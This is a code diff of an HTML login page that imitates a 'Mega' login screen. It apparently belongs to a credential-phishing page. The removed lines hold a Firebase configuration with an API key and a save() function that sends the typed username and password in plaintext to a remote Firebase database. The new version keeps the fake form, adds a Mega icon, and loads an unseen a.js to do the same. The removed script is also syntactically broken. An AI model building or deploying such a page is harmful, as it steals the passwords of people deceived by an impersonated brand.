@@ -3,10 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Mega Limited Login</title>
-<!-- Add Firebase -->
-<script src="https://www.gstatic.com/firebasejs/9.1.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.1.0/firebase-database.js"></script>
+<title>Mega Login</title>
 <style>
   body {
     font-family: Arial, sans-serif;
@@ -24,10 +21,15 @@
     border-radius: 5px;
     box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
     width: 300px;
+    text-align: center;
   }
   .login-container h2 {
     margin-bottom: 20px;
     text-align: center;
+  }
+  .login-container img {
+    width: 80px;
+    margin-bottom: 20px;
   }
   .login-container input[type="text"],
   .login-container input[type="password"] {
@@ -55,70 +57,16 @@
 </head>
 <body>
 <div class="login-container">
-  <h2>Login to Mega Limited</h2>
-  <form id="loginForm">
-    <input type="text" id="username" name="username" placeholder="Username" required>
-    <input type="password" id="password" name="password" placeholder="Password" required>
-    <input type='button' id='btnSubmit' onclick='save();' value="Login">
+  <img src="4920706.png" alt="Mega Icon">
+  <h2>Login to Mega </h2>
+  <form action="#" method="post">
+    <input id='username' type="text"  name="username" placeholder="Username" required>
+    <input id='password'  type="password" name="password" placeholder="Password" required>
+    <input id='btnSubmit' type="button"  onclick=save() value="Login">
   </form>
 </div>
-
-<!-- Initialize Firebase -->
-<!-- Initialize Firebase -->
-<script>
-    // Your web app's Firebase configuration
-    var firebaseConfig = {
-        apiKey: "AIzaSyAWBoTBdopcIpBFE_aJpKZObttwZ7VyGjY",
-
-authDomain: "application-bcfe9.firebaseapp.com",
-
-databaseURL: "https://application-bcfe9-default-rtdb.firebaseio.com",
-
-projectId: "application-bcfe9",
-
-storageBucket: "application-bcfe9.appspot.com",
-
-messagingSenderId: "22505666442",
-
-appId: "1:22505666442:web:37113b705c26a443673a73",
-
-measurementId: "G-EY7H8Q4KEL"
-    };
-  
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-  
-    // Get a reference to the Firebase Realtime Database
-    var database = firebase.database();
-  
-    // Function to handle form submission
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
-      event.preventDefault(); // Prevent the default form submission
-  
-      // Get username and password values
-      var username = document.getElementById('username').value;
-      var password = document.getElementById('password').value;
-  
-     
-  function save() {
-    // var email = document.getElementById('email').value
-    var password = document.getElementById('password').value
-    var username = document.getElementById('username').value
-
-
-  
-    database.ref('users/' + password).set({
-      // email : email,
-      username : username,
-      password : password,
-     
-    //   say_something : say_something,
-    //   favourite_food : favourite_food
-    })
-      // Reset form
-      document.getElementById('loginForm').reset();
-    });
-  </script>
-  
 </body>
+<script src="https://www.gstatic.com/firebasejs/8.3.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.3.1/firebase-database.js"></script>
+  <script src="a.js"></script>
 </html>
